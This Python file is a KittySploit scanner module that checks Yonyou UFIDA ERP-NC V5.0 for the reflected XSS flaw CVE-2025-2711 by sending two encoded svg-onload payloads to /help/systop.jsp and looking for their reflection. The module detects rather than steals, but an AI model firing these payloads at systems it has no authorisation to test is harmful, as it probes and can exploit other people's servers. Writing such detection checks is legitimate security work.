#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Yonyou UFIDA ERP-NC V5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Yonyou UFIDA ERP-NC V5.0 - Cross-Site Scripting Detection',
        'description': 'Yonyou UFIDA ERP-NC V5.0 is vulnerable to reflected cross-site scripting (XSS) via the langcode parameter in /help/systop.jsp and /help/top.jsp. Unsanitized user input is reflected in the response, allowing arbitrary JavaScript execution.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'xss', 'erp-nc', 'ufida', 'yonyou', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/Hebing123/cve/issues/86', 'https://nvd.nist.gov/vuln/detail/CVE-2025-2711'],
        'cve': 'CVE-2025-2711',
    }

    def run(self):
        for path in ('/help/systop.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E', '/help/systop.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            body_all = ('<svg onload=alert(document.domain)>.png)', 'Search.jsp',)
            ctype_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
                self.set_info(
                    severity='medium',
                    reason='Yonyou UFIDA ERP-NC V5.0 - Cross-Site Scripting detected',
                    path=path,
                )
                return True
        return False

